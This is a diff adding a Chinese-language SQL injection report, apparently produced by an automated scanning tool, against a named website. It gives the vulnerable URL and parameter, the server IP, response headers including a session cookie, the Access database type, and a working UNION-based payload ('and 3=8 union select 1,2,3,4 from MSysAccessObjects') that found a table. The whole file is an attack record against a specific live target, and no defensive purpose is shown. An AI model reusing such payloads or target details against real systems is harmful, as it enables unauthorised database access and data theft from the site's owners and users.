@@ -1,0 +1,25 @@
+■漏洞信息:============================================================
+ ·URL:http://www.abzg.com.cn/showbusiness.asp?ID=81
+ ·页面标题：::爱遍中国::
+ ·参数:ID=81
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:58.218.198.59
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 10 Sep 2011 12:44:55 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 154777
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDSARRBQBS=CPPFAGGBIKDEOIFDDHDGNOEF; path=/
+Cache-control: private
+
+
+联合查询列数: 总共= 4  显示的列= 2
+联合查询SQL: and 3=8 union select 1,2,3,4 from MSysAccessObjects
+找到表:news
